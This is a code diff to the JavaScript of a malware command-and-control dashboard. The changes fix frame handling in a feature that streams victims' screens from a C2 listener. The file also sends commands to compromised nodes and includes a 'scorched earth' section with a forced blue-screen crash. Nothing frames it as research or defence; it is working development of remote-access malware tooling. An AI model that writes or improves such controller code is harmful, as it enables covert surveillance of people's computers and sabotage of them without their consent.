@@ -19,6 +19,7 @@ let leafletMarkers = [];
 let streamInterval = null;
 let streamSwitchTime = 0; // Prevents fetching old cached frames when switching
 let streamTimeoutTracker = null; // Triggers 10s warning if no frames arrive
+let currentStreamSessionId = null; // Strikout trailing frames from older sessions entirely
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -437,9 +438,11 @@ function setStreamLoadingState() {
     const spinner = document.getElementById('liveViewSpinner');
     const imageEl = document.getElementById('liveViewImage');
     
+    // Clear out visually
     imageEl.style.display = 'none';
-    imageEl.src = ''; // Clear old cached frame entirely
+    imageEl.src = ''; 
     
+    // Setup spinner
     spinner.style.display = 'flex';
     spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
     
@@ -477,6 +480,7 @@ window.startStream = async function() {
         return showToast("No active node selected!", "error");
     }
 
+    // Ensure panel is not minimized
     const panel = document.getElementById('panel-live');
     if (panel.dataset.minimized === 'true') {
         toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
@@ -491,7 +495,8 @@ window.startStream = async function() {
     const title = document.getElementById('liveViewTitle');
     const toggleBtn = document.getElementById('streamToggleBtn');
     
-    // Trigger wait delay to fix frame bleeding
+    // Unique ID generation for this specific fetch session loop
+    currentStreamSessionId = Date.now();
     streamSwitchTime = Date.now();
     setStreamLoadingState();
 
@@ -506,8 +511,10 @@ window.startStream = async function() {
     termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
     await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
     
+    // Bind dynamic source change
     document.getElementById('streamTarget').onchange = () => {
         if(streamInterval) {
+            currentStreamSessionId = Date.now(); // Renew the loop session tracking
             streamSwitchTime = Date.now();
             setStreamLoadingState(); 
             termLog(`Switching stream source...`);
@@ -525,10 +532,12 @@ window.startStream = async function() {
 };
 
 async function fetchFrame() {
-    if (!activeNodeId) {
-        return stopStream();
+    if (!activeNodeId || !currentStreamSessionId) {
+        return;
     }
     
+    const mySessionId = currentStreamSessionId;
+
     // Ignore fetched frames for 3.5 seconds after a switch to prevent bleeding old cache
     if (Date.now() - streamSwitchTime < 3500) {
         return;
@@ -541,6 +550,11 @@ async function fetchFrame() {
         const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
+        
+        // Critical verification: did the user click stop or switch monitors while we were fetching?
+        if (mySessionId !== currentStreamSessionId) {
+            return; // Destroy the delayed frame to prevent it from bleeding over
+        }
         
         if (response.ok) {
             const data = await response.json();
@@ -571,6 +585,10 @@ window.stopStream = function() {
         clearTimeout(streamTimeoutTracker);
         streamTimeoutTracker = null;
     }
+    
+    // Flushes validation so trailing delayed fetches get nuked automatically
+    currentStreamSessionId = null;
+    
     if (activeNodeId) {
         sendCommandToNode(activeNodeId, "STOP_STREAM");
         termLog(`Stream stopped for ${activeNodeId}.`);
@@ -583,9 +601,11 @@ window.stopStream = function() {
         toggleBtn.title = "Play Stream";
     }
     
+    const imageEl = document.getElementById('liveViewImage');
+    imageEl.style.display = 'none';
+    imageEl.src = ''; // Guarantee visual cache flush
+    
     document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
-    document.getElementById('liveViewImage').style.display = 'none';
-    document.getElementById('liveViewImage').src = '';
     
     const spinner = document.getElementById('liveViewSpinner');
     if(spinner) {
@@ -595,7 +615,7 @@ window.stopStream = function() {
 };
 
 // ==========================================
-// SCORCHED EARTH & FUN
+// POWERFUL MODULES (SCORCHED EARTH & FUN)
 // ==========================================
 window.triggerBSOD = function() {
     termLog('Command queued: BSOD (Blue Screen)');
